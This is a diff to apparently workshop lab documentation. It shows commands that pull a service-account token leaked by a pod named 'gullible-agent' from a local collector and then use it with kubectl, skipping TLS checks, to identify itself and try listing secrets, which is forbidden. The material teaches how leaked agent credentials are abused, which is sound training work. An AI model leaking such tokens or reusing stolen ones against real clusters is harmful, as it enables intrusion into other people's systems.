@@ -15,19 +15,20 @@ $ curl -s -H 'Host: sites.localhost' http://127.0.0.1:18180/count
 leaks=1
 last=API_TOKEN=sk-container-42 | service account token: eyJhbGciOiJSUzI1NiIs...(the full token)
 
+# Play the attacker: take the token from the collector and use it (ids masked)
 $ TOKEN=$(curl -s -H 'Host: sites.localhost' http://127.0.0.1:18180/leaks \
   | grep -o 'service account token: [^"]*' | head -1 | cut -d' ' -f4)
 $ API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
 $ kubectl --kubeconfig=/dev/null -s "$API" --insecure-skip-tls-verify --token "$TOKEN" auth whoami
 ATTRIBUTE                                           VALUE
 Username                                            system:serviceaccount:default:default
-UID                                                 (a UID)
+UID                                                 (an id)
 Groups                                              [system:serviceaccounts system:serviceaccounts:default system:authenticated]
 Extra: authentication.kubernetes.io/credential-id   [JTI=(an id)]
 Extra: authentication.kubernetes.io/node-name       [workshop-toolbox-control-plane]
-Extra: authentication.kubernetes.io/node-uid        [(a UID)]
+Extra: authentication.kubernetes.io/node-uid        [(an id)]
 Extra: authentication.kubernetes.io/pod-name        [gullible-agent-(suffix)]
-Extra: authentication.kubernetes.io/pod-uid         [(a UID)]
+Extra: authentication.kubernetes.io/pod-uid         [(an id)]
 
 $ kubectl --kubeconfig=/dev/null -s "$API" --insecure-skip-tls-verify --token "$TOKEN" get secrets
 Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:default:default" cannot list resource "secrets" in API group "" in the namespace "default"
